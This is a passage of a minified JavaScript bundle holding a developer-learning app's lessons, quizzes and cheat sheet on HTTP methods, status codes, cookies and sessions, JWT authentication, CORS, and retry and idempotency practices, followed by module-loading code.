The client sends a **request**. The server sends back one **response**. Then that exchange is finished.`},{type:"code",code:{lang:"http",text:`GET /api/orders/42?expand=items HTTP/1.1
Host: shop.example.com
Accept: application/json
Authorization: Bearer eyJhbGciOi...`}},{type:"code",code:{lang:"http",text:`HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{"id": 42, "total": 50, "items": [...]}`}},{type:"diagram",text:`Request  = method + URL + headers + (body)
Response = status code + headers + (body)

URL = /api/orders/42  ?expand=items
      └── path ──────┘ └ query string`},{type:"text",text:'HTTP is **stateless**. Each request stands alone. The server does not "remember" you between requests. If it needs to know who you are, the request must bring that info itself: a **cookie** or a **token**.'},{type:"example",title:"Your best debugging tool",text:'Open DevTools → **Network** tab. Every API call is one request/response pair. You can see the method, URL, headers, body, status code and timing. When "the API is broken", look here first.'}],remember:"HTTP = request in, response out. Each request stands alone.",questions:[{id:"web.request-response.1",kind:"mcq",difficulty:"easy",prompt:"HTTP is **stateless**. What does that mean for your app?",choices:["The server must not keep any data, not even in a database","Each request must bring its own context, like a cookie or token","The browser may not cache responses, so each one is fresh","Each request opens a new connection that closes right after"],answer:1,why:'The protocol does not remember earlier requests. Apps add "memory" by sending a cookie or token with every request. The server can still store data in a database.'},{id:"web.request-response.2",kind:"debug",difficulty:"easy",prompt:"A user clicks **Save**. Nothing happens and no error is shown. What is the fastest way to see what actually happened?",choices:["Restart the web server and ask the user to try again","Ask the user to clear cookies and cache, then log in again","Check the request, status code and response in the Network tab","Add console.log calls to the Save handler and redeploy"],answer:2,why:'The Network tab shows if a request was sent at all, what status came back (400? 500?) and the error body. That turns "nothing happens" into a real clue.',remember:"Silent bug in the UI → open the Network tab."},{id:"web.request-response.3",kind:"code",difficulty:"medium",prompt:"The server reads `qty` from the query string and always gets nothing. Why?",code:{lang:"http",text:`POST /api/cart?notify=true HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{"productId": 7, "qty": 2}`},choices:["`qty` is in the JSON body, not in the query string","POST requests cannot have a query string","The `Host` header is wrong","JSON numbers must be sent as strings"],answer:0,why:"Only `notify=true` is in the query string. `qty` lives in the body. The server must read the body (for example `[FromBody]` in ASP.NET Core)."}]},{id:"web.methods",title:"HTTP methods and REST",summary:"GET, POST, PUT, PATCH, DELETE — and which ones are safe to repeat.",minutes:4,blocks:[{type:"text",text:`The **method** says what you want to do.
**REST** is a common API style: the URL names a **thing** (a resource, like an order), and the method is the **action**.`},{type:"code",code:{lang:"http",text:`GET    /api/orders       list orders
GET    /api/orders/42    read order 42
POST   /api/orders       create a new order
PUT    /api/orders/42    replace order 42 completely
PATCH  /api/orders/42    change some fields of order 42
DELETE /api/orders/42    delete order 42`}},{type:"diagram",text:`Method  Safe?  Idempotent?
GET     yes    yes
PUT     no     yes
DELETE  no     yes
POST    no     no
PATCH   no     not guaranteed`},{type:"list",items:["**Safe** = does not change data. Just reading.","**Idempotent** = sending it 1 time or 5 times leaves the server in the same state.",'`PUT /users/7 {"name":"Ann"}` five times → still one user called Ann.',"`POST /orders` five times → five orders. 😬"]},{type:"example",title:"Why it matters",text:"Browsers, proxies and retry libraries may repeat a GET or PUT without asking. They should not blindly repeat a POST. And bots (link previews, crawlers, prefetch) happily open GET links — so a GET must never change data."}],remember:"GET reads, POST creates, PUT replaces, PATCH changes part, DELETE removes. Idempotent = safe to repeat.",questions:[{id:"web.methods.1",kind:"scenario",difficulty:"medium",prompt:"A mobile app on bad Wi-Fi sends a request, gets a timeout, and automatically sends it again. Which request is the most dangerous to repeat?",choices:["`GET /api/orders/42`","`PUT /api/users/7` with the full profile","`POST /api/payments`","`DELETE /api/cart/items/3`"],answer:2,why:"POST is not idempotent. If the first request actually reached the server, the retry can create a second payment. GET, PUT and DELETE leave the same final state when repeated.",remember:"Timeout + retry + POST = possible duplicate."},{id:"web.methods.2",kind:"truefalse",difficulty:"medium",prompt:"`DELETE /api/orders/42` returns `204` the first time and `404` the second time. So DELETE is **not** idempotent.",choices:["True","False"],answer:1,why:"Idempotency is about the server state, not the exact response. After one call or ten calls, order 42 is gone. The different status code is fine."},{id:"web.methods.3",kind:"debug",difficulty:"hard",prompt:"User accounts disappear. Logs show `GET /admin/deleteUser?id=...` calls coming from a chat app's link preview bot. An admin had pasted the links in chat. What is the design mistake?",choices:["The bot should be blocked by IP address","The user ids should be GUIDs","The admin page should use a nicer UI","A GET request changes data"],answer:3,why:"GET must be safe: bots, crawlers and browsers open GET links without asking. Deleting must use DELETE (or POST) and require an authorized user.",remember:"GET never changes data."},{id:"web.methods.4",kind:"compare",difficulty:"medium",prompt:"You want to change **only** the email of user 7. Which request fits best?",choices:['`PATCH /api/users/7` with `{"email":"a@b.com"}`','`PUT /api/users/7` with `{"email":"a@b.com"}`',"`GET /api/users/7?email=a@b.com`","`POST /api/updateUserEmail7`"],answer:0,why:'PATCH means "change these fields". PUT means "replace the whole resource with this", so a PUT with only an email may wipe the other fields. GET must not change data.'}]},{id:"web.status-codes",title:"Status codes: what the server is telling you",summary:"The 3-digit number that tells you whose fault it is.",minutes:4,blocks:[{type:"text",text:"Every response starts with a **status code**. The first digit tells you the family."},{type:"diagram",text:`2xx  Success       it worked
3xx  Redirect      look somewhere else
4xx  Client error  the REQUEST is wrong
5xx  Server error  the SERVER failed`},{type:"list",items:["`200 OK` · `201 Created` (POST made something) · `204 No Content` (done, nothing to return)","`304 Not Modified` — your cached copy is still good","`400 Bad Request` — invalid input · `404 Not Found` · `409 Conflict` — clashes with current state","`429 Too Many Requests` — slow down (rate limit)","`500` — bug or crash in the server · `502 / 504` — a proxy could not get a (timely) answer from the app behind it · `503` — temporarily unavailable"]},{type:"compare",left:{title:"401 Unauthorized",items:['"Who are you? I do not know you."',"Missing, expired or invalid token","Fix: log in again / refresh the token"]},right:{title:"403 Forbidden",items:['"I know who you are."',"But you are not allowed to do this","Logging in again will not help"]}},{type:"text",text:'Return **honest** status codes. `200 OK` with `{"error": "not found"}` in the body fools monitoring, caches and retry logic: they all see "success".'}],remember:"4xx = fix the request. 5xx = fix the server. 401 = who are you? 403 = not allowed.",questions:[{id:"web.status-codes.1",kind:"scenario",difficulty:"easy",prompt:"A normal (non-admin) user with a **valid** token calls `DELETE /api/admin/users/9`. Which status code fits best?",choices:["401 Unauthorized","403 Forbidden","500 Internal Server Error","201 Created"],answer:1,why:'The server knows who the user is (valid token), but they lack permission. That is 403. 401 would mean "I do not know who you are".',remember:"401 = not logged in. 403 = logged in, not allowed."},{id:"web.status-codes.2",kind:"debug",difficulty:"medium",prompt:"Every morning, users see their API calls fail with `401` about an hour after they log in. Logging in again fixes it. What is the most likely cause?",choices:["The database connection pool times out after an hour","A background job removes the user's role every hour","The access token expires and the app never refreshes it","The CORS policy is cached for an hour, then blocks calls"],answer:2,why:"401 means the server no longer accepts who you are. A token that expires after 60 minutes, with no refresh logic, matches the pattern exactly. A lost role would give 403."},{id:"web.status-codes.3",kind:"mcq",difficulty:"medium",prompt:'An API returns `200 OK` with the body `{"success": false, "error": "Order not found"}`. What is the main problem?',choices:['Tools see "success"; it should be a 404',"The JSON keys should be in PascalCase","Nothing, status codes only matter for browsers","The body should always be empty on errors"],answer:0,why:"Monitoring, caches, retry libraries and frontend code all trust the status code first. Hiding errors behind 200 makes failures invisible."},{id:"web.status-codes.4",kind:"debug",difficulty:"hard",prompt:"Users get `502 Bad Gateway`. Your API logs show **no errors and no incoming requests** during that time. What is most likely?",choices:["A null reference bug in your controller","The users sent invalid JSON","The proxy in front could not reach your app","The users' tokens have expired"],answer:2,why:"502 comes from a proxy or load balancer that got no valid answer from the app behind it. If your app logged nothing, the request probably never reached it: app down, crashed, or wrong port.",remember:"502/504 = look at the proxy and whether the app is up."}]},{id:"web.headers-cookies",title:"Headers, cookies and sessions",summary:"How a stateless protocol remembers who you are.",minutes:4,blocks:[{type:"text",text:"**Headers** are `Name: value` lines with extra info about the request or response. A few you will see every day:"},{type:"list",items:["`Content-Type` — format of the body (`application/json`)","`Accept` — formats the client wants back","`Authorization` — credentials, e.g. `Bearer <token>`","`Cache-Control` — may this response be cached, and for how long","`Set-Cookie` (response) / `Cookie` (request) — cookies"]},{type:"text",text:"A **cookie** is a small value the server asks the browser to keep. The browser then sends it back **automatically** with matching requests to that site."},{type:"code",code:{lang:"http",text:`HTTP/1.1 200 OK
Set-Cookie: sid=a8f3k2; HttpOnly; Secure; SameSite=Lax; Path=/

--- later, the browser sends: ---
GET /api/cart HTTP/1.1
Cookie: sid=a8f3k2`}},{type:"list",items:["`HttpOnly` — page JavaScript cannot read it (`document.cookie`)","`Secure` — only sent over HTTPS","`SameSite` — is it sent when another site triggers the request? (`Strict` / `Lax` / `None`)","`Expires` / `Max-Age` — without them, the cookie disappears when the browser closes"]},{type:"diagram",text:`Browser            Server          Session store
  │ POST /login ──────►│                    │
  │                    │── save a8f3 ──────►│
  │                    │   {userId: 7}      │
  │◄─ Set-Cookie: a8f3 │                    │
  │ GET /cart          │                    │
  │ Cookie: a8f3 ─────►│── find a8f3 ──────►│`},{type:"text",text:"A **session** = data kept on the **server**. The cookie only holds a random id. Users can see and edit their cookies, so never trust a cookie value like `isAdmin=true`."}],remember:"Cookie = small value the browser sends back automatically. Session = data on the server, found by the id in the cookie.",questions:[{id:"web.headers-cookies.1",kind:"debug",difficulty:"medium",prompt:"You scaled the app from 1 to 3 servers behind a load balancer. Now users are randomly logged out. Sessions are stored in each server's memory. Why?",choices:["Cookies stop working with more than one server","Some requests hit a server that does not have that session","The load balancer deletes all cookies","HTTPS was turned off on the new servers"],answer:1,why:"The cookie still arrives, but server B has never seen session `a8f3`. Use a shared session store (Redis, database) or tokens.",remember:"More than one server → shared session store."},{id:"web.headers-cookies.2",kind:"mcq",difficulty:"medium",prompt:"Your session cookie has the `HttpOnly` flag. What does that protect against?",choices:["A script in the page reading `document.cookie`","Someone sniffing plain HTTP traffic","Other websites triggering requests with the cookie","The cookie growing too large"],answer:0,why:"HttpOnly hides the cookie from JavaScript. Sniffing is what `Secure` (HTTPS only) helps with, and cross-site sending is what `SameSite` controls."},{id:"web.headers-cookies.3",kind:"debug",difficulty:"hard",prompt:"The frontend at `https://app.example.com` calls `https://api.example.com` with `fetch`. The API set a session cookie at login, but later API calls arrive **without** the cookie. Most likely cause?",choices:["Browsers only attach cookies to GET requests, not POST","The cookie is HttpOnly, so the browser never sends it back","fetch needs `credentials: 'include'` to send cookies to another origin","The API must set the cookie again on every response"],answer:2,why:"By default `fetch` only sends cookies to the same origin. For another origin you need `credentials: 'include'`, and the API must answer with `Access-Control-Allow-Credentials: true`."},{id:"web.headers-cookies.4",kind:"scenario",difficulty:"medium",prompt:"A developer stores `role=admin` in a normal cookie and the server reads it to decide permissions. Is that OK?",choices:["Yes, cookies are set by the server, so they are trusted","Yes, if the cookie is HttpOnly","No, users can edit cookies; keep the role on the server","Yes, if the site uses HTTPS"],answer:2,why:"Anyone can change a cookie in DevTools or send any Cookie header with a script. HttpOnly and HTTPS do not stop the user themselves. Keep the role server-side, or inside a signed token the server verifies.",remember:"Never trust data the client can edit."}]},{id:"web.auth-jwt",title:"Who are you? Auth basics and JWT",summary:"Authentication vs authorization, and what is inside a JWT.",minutes:4,blocks:[{type:"text",text:`**Authentication** = Who are you? (login, password, SSO)
**Authorization** = What are you allowed to do? ("only admins can delete")
Authentication always comes first.`},{type:"diagram",text:`Request ─► Authentication ─► Authorization ─► Handler
           "Who are you?"   "May you do it?"
           fail → 401       fail → 403`},{type:"text",text:"After login, the client must prove who it is on every request. Two common ways: a **session cookie** (last lesson) or a **token** in a header:\n`Authorization: Bearer <token>`"},{type:"text",text:"A **JWT** (JSON Web Token) is a popular token format. Three parts, separated by dots:"},{type:"diagram",text:`xxxxx.yyyyy.zzzzz
  │     │     └ signature: proves the server made it
  │     └ payload: {"sub":"7","role":"user","exp":...}
  └ header: {"alg":"HS256","typ":"JWT"}`},{type:"list",items:["The payload is **base64url-encoded, not encrypted**. Anyone who has the token can read it. Never put secrets in it.","The **signature** lets the server detect any change. Edit one letter of the payload → the check fails.","The server must check the signature **and** `exp` (expiry) on every request.",'A JWT stays valid until it expires. Logout does not "kill" it unless you add extra work.']},{type:"compare",left:{title:"Session cookie",items:["Server stores the session","Easy to revoke: delete the session","Browser sends it automatically"]},right:{title:"JWT bearer token",items:["Server stores nothing per user","Hard to revoke before it expires","Client code adds the header"]}}],remember:"AuthN = who are you (401). AuthZ = what can you do (403). A JWT payload is readable by anyone.",questions:[{id:"web.auth-jwt.1",kind:"mcq",difficulty:"medium",prompt:"You paste a JWT from your app into a JWT decoder website. You can read the `email` and `role` without any key. What does that tell you?",choices:["The token is broken: a valid JWT is encrypted","The signing key has leaked to the decoder site","Normal: the payload is encoded, not encrypted","The token has expired, so its claims are now public"],answer:2,why:"Base64url is just an encoding. Anyone can decode it. The signature protects against **changes**, not against **reading**.",remember:"JWT payload = public. Signature = tamper-proof."},{id:"web.auth-jwt.2",kind:"scenario",difficulty:"hard",prompt:'A user decodes their JWT, changes `"role":"user"` to `"role":"admin"`, encodes it again and sends it. The server validates tokens correctly. What happens?',choices:["They become admin","The server re-signs the token with the new role","The server ignores the payload and uses the header","The signature no longer matches, so it is rejected"],answer:3,why:"The signature was made over the original header and payload. Without the server's key, the user cannot make a matching signature, so validation fails (401)."},{id:"web.auth-jwt.3",kind:"mcq",difficulty:"medium",prompt:"Which of these is an **authorization** check?",choices:["Is the password correct for this email?","Is the token signature valid for our key?","Is this user the owner of invoice 1043?","Has the token expired or been revoked?"],answer:2,why:'The other three all answer "who are you, really?" (authentication). "May this user touch this invoice?" is about permission — authorization.'},{id:"web.auth-jwt.4",kind:"scenario",difficulty:"medium",prompt:"An employee is fired and their account is disabled. Their JWT access token is valid for 7 more days. What is the situation?",choices:["Safe: JWTs stop working when the account is disabled","Safe: the browser deletes the token on logout","Risky: it works until it expires; use short-lived tokens + refresh","Safe: ask the user to clear their browser cache"],answer:2,why:"A server that only checks signature and expiry will accept the token for 7 days. Short access tokens (minutes) plus refresh tokens, or a deny list, limit this."}]},{id:"web.cors",title:"CORS: the browser's permission check",summary:"Why it fails in the browser but works in Postman.",minutes:4,blocks:[{type:"text",text:"An **origin** = scheme + host + port.\n`http://localhost:5173` and `http://localhost:5000` are **different** origins. So are `https://app.example.com` and `https://api.example.com`."},{type:"text",text:'Browser JavaScript may send requests to another origin, but it **cannot read the response** unless that server says "this origin is allowed". This permission system is **CORS** (Cross-Origin Resource Sharing).'},{type:"diagram",text:`Browser (app.com)                 API (api.com)
  │ OPTIONS /orders   (preflight)     │
  │ Origin: https://app.com ─────────►│
  │◄─ Access-Control-Allow-Origin:    │
  │     https://app.com               │
  │ POST /orders ────────────────────►│
  │◄─ 201 + Allow-Origin header ──────│`},{type:"text",text:'For "non-simple" requests the browser first sends a **preflight** `OPTIONS` request. Common triggers: a JSON body (`Content-Type: application/json`), an `Authorization` header, or methods like PUT and DELETE.'},{type:"code",code:{lang:"csharp",text:`// ASP.NET Core: allow one known frontend
builder.Services.AddCors(o => o.AddPolicy("web", p => p
    .WithOrigins("https://app.example.com")
    .AllowAnyHeader()
    .AllowAnyMethod()));

app.UseCors("web"); // before auth middleware`}},{type:"list",items:["CORS is enforced by the **browser**. Postman, curl and server-to-server calls ignore it.","Fix CORS on the **API**, not in the frontend code.","`Access-Control-Allow-Origin: *` does not work together with cookies (credentials).","In local dev, a dev-server proxy (e.g. Vite `server.proxy`) makes calls same-origin."]}],remember:'CORS = the browser asks the API "may this origin read your answer?" Fix it on the API.',questions:[{id:"web.cors.1",kind:"debug",difficulty:"easy",prompt:"The frontend shows a CORS error, but the same request in Postman works fine. Why?",choices:["Postman uses a different network route that skips the firewall","CORS is checked by the browser; Postman does not check it","The API detects browser user agents and blocks them","Postman formats the JSON body in a way the API accepts"],answer:1,why:"The server answered both times. The browser then checked the CORS headers and refused to give the response to your JavaScript. Postman has no such rule.",remember:"Works in Postman, fails in browser → think CORS."},{id:"web.cors.2",kind:"scenario",difficulty:"medium",prompt:"Your React dev server runs on `http://localhost:5173`, the API on `http://localhost:5000`. You get CORS errors. What is the right fix?",choices:["Add `mode: 'no-cors'` to every fetch call","Allow `http://localhost:5173` in the API's CORS policy","Start the browser with web security disabled","Move the frontend to port 5000 as well"],answer:1,why:"Different ports = different origins, so the API must allow the frontend origin (or you use the dev-server proxy). `no-cors` gives you an empty, unreadable response, and disabling browser security only hides the problem on your machine."},{id:"web.cors.3",kind:"debug",difficulty:"hard",prompt:"GET calls work. A `POST` with a JSON body fails with a CORS error. The Network tab shows an `OPTIONS` request that got `401`. What is going on?",choices:["Browsers do not allow JSON bodies in cross-origin calls","POST is never allowed cross-origin; only GET can be shared","The preflight is blocked by auth before CORS can answer","The server must disable OPTIONS so POST can go through"],answer:2,why:"The JSON body makes the browser send a preflight. Preflights carry no credentials, so if auth runs first it returns 401 without CORS headers. Put CORS before auth so OPTIONS gets a proper answer."},{id:"web.cors.4",kind:"mcq",difficulty:"medium",prompt:"The API answers with `Access-Control-Allow-Origin: *`. The frontend calls it with `credentials: 'include'` to send cookies. What happens?",choices:["It works, because `*` allows every site, cookies or not","The browser refuses to let the page read the response","The server rejects the request with a 403 before it runs","The browser drops the cookie and sends the call without it"],answer:1,why:"With credentials, browsers do not accept the `*` wildcard. The API must send the exact origin plus `Access-Control-Allow-Credentials: true`."}]},{id:"web.reliability",title:"Timeouts, retries, rate limits, idempotency",summary:"Networks fail. Plan for it.",minutes:5,blocks:[{type:"text",text:"Every network call can be slow, fail, or hang. Good clients use a **timeout**, then maybe **retry** with a pause. Good servers protect themselves with a **rate limit**."},{type:"list",items:["**Timeout** — how long you wait before giving up. .NET `HttpClient` waits 100 seconds by default. Browser `fetch` has no timeout option of its own.","**Retry** — only for errors that may pass: timeouts, `502`, `503`, `504`, and `429` after waiting. Never for `400`, `401`, `403`, `404` — same request, same answer.","**Backoff** — wait longer between tries, plus a little randomness (jitter), so all clients do not retry at the same moment."]},{type:"code",code:{lang:"ts",text:`const res = await fetch('/api/report', {
  signal: AbortSignal.timeout(5000), // give up after 5 s
});`}},{type:"diagram",text:`try 1 ✗  wait 1 s
try 2 ✗  wait 2 s
try 3 ✗  wait 4 s   (+ random jitter)
try 4 ✓`},{type:"code",code:{lang:"http",text:`HTTP/1.1 429 Too Many Requests
Retry-After: 30`}},{type:"text",text:`The hard case: a **POST times out**. Did the server create the payment or not? You cannot know.
Fix: an **idempotency key**. The client makes a unique id per action. The server remembers it and returns the first result for any repeat.`},{type:"code",code:{lang:"http",text:`POST /api/payments HTTP/1.1
Idempotency-Key: 3f6c1a2e-9b7d-4c1e-a0f2-5d8e7b6c4a19
Content-Type: application/json

{"orderId": 42, "amount": 50}`}}],remember:"Always set a timeout. Retry only temporary errors, with backoff. Make retried POSTs safe with an idempotency key.",questions:[{id:"web.reliability.1",kind:"scenario",difficulty:"medium",prompt:"Your API calls a payment provider. The call times out after 30 s. You do not know if the charge happened. What is the safest design?",choices:["Retry immediately, up to 10 times","Send an idempotency key so a retry cannot charge twice",'Show an error and let the user click "Pay" again',"Raise the timeout to 10 minutes"],answer:1,why:"With the same key, the provider sees a retry as the same payment and does not charge again. Blind retries — by code or by the user clicking again — risk a double charge.",remember:"Retrying a POST? Add an idempotency key."},{id:"web.reliability.2",kind:"perf",difficulty:"hard",prompt:"A downstream service gets slow. Your 50 API instances each retry failed calls 5 times **immediately**, with no delay. The downstream service now falls over completely. What happened?",choices:["Retries multiplied the load at the worst moment","The timeout was too long","The downstream service needs more indexes","HTTP/2 was turned off"],answer:0,why:"Each failed call became up to 6 calls, all at once. A struggling service got several times more traffic. Use backoff with jitter, a retry limit, and maybe a circuit breaker.",remember:'Retries without backoff can turn "slow" into "down".'},{id:"web.reliability.3",kind:"mcq",difficulty:"easy",prompt:"Which response is usually pointless to retry automatically?",choices:["503 Service Unavailable","400 Bad Request","429 Too Many Requests (after waiting)","A network timeout"],answer:1,why:"400 means the request itself is wrong. Sending the same request again gives the same 400. The others are often temporary."},{id:"web.reliability.4",kind:"perf",difficulty:"medium",prompt:"Your .NET API calls a partner API using default `HttpClient` settings. When the partner hangs, your own requests pile up and wait for about 100 seconds each. What should you add first?",choices:["More logging around the partner call","A retry with no delay between tries","A larger connection pool for HttpClient","A short, explicit timeout for that call"],answer:3,why:"The default HttpClient timeout is 100 s. A short timeout (based on what the partner normally needs) frees your requests quickly so you can fail fast or show a fallback."}]}],cheatSheet:[{title:"HTTP methods",items:[{term:"GET",meaning:"Read · safe ✅ · idempotent ✅"},{term:"POST",meaning:"Create / action · safe ❌ · idempotent ❌"},{term:"PUT",meaning:"Replace whole resource · safe ❌ · idempotent ✅"},{term:"PATCH",meaning:"Change some fields · safe ❌ · idempotent: not guaranteed"},{term:"DELETE",meaning:"Remove · safe ❌ · idempotent ✅"},{term:"Idempotent",meaning:"1 call or 5 calls → same server state"}]},{title:"Status codes",items:[{term:"200 / 201 / 204",meaning:"OK / Created / OK, no body"},{term:"304",meaning:"Not Modified — use your cached copy"},{term:"400",meaning:"Bad request — fix the input, do not retry"},{term:"401",meaning:"Not authenticated — who are you?"},{term:"403",meaning:"Authenticated, but not allowed"},{term:"404 / 409",meaning:"Not found / conflicts with current state"},{term:"429",meaning:"Rate limited — wait (see Retry-After)"},{term:"500",meaning:"Server bug or crash"},{term:"502 / 503 / 504",meaning:"Proxy got bad answer / unavailable / proxy timed out"}]},{title:"Headers & cookies",items:[{term:"Content-Type",meaning:"Format of the body, e.g. application/json"},{term:"Authorization",meaning:"Credentials, e.g. Bearer <token>"},{term:"Set-Cookie / Cookie",meaning:"Server stores a value / browser sends it back automatically"},{term:"HttpOnly",meaning:"JavaScript cannot read the cookie"},{term:"Secure",meaning:"Cookie only sent over HTTPS"},{term:"SameSite",meaning:"Controls sending the cookie on requests from other sites"},{term:"Session",meaning:"Data on the server; cookie holds only the id"}]},{title:"Auth, CORS, reliability",items:[{term:"AuthN vs AuthZ",meaning:"Who are you? vs What may you do?"},{term:"JWT",meaning:"header.payload.signature — payload readable, signature stops changes"},{term:"CORS",meaning:"Browser rule: may this origin read the response? Fix on the API"},{term:"Preflight",meaning:"OPTIONS sent first for JSON bodies, custom headers, PUT/DELETE"},{term:"Timeout",meaning:"Always set one; .NET HttpClient default is 100 s"},{term:"Retry",meaning:"Only temporary errors, with backoff + jitter"},{term:"Idempotency-Key",meaning:"Makes a retried POST run only once"}]}]},C=Object.freeze(Object.defineProperty({__proto__:null,default:O},Symbol.toStringTag,{value:"Module"})),q=["thinking","data-structures","performance","database","web","concurrency","debugging","architecture","distributed-systems","security","ai","business"],P=Object.assign({"./ai/index.ts":r,"./architecture/index.ts":d,"./business/index.ts":c,"./concurrency/index.ts":u,"./data-structures/index.ts":p,"./database/index.ts":g,"./debugging/index.ts":f,"./distributed-systems/index.ts":k,"./performance/index.ts":x,"./security/index.ts":A,"./thinking/index.ts":I,"./web/index.ts":C}),a=q.map(e=>P[`./${e}/index.ts`]?.default).filter(e=>!!e),o=new Map,E=new Map;for(const e of a)for(const t of e.lessons){E.set(t.id,{lesson:t,category:e});for(const s of t.questions)o.set(s.id,{question:s,lesson:t,category:e})}const W=[...o.values()],R=e=>a.find(t=>t.id===e);export{W as a,a as c,R as g,E as l,o as q};
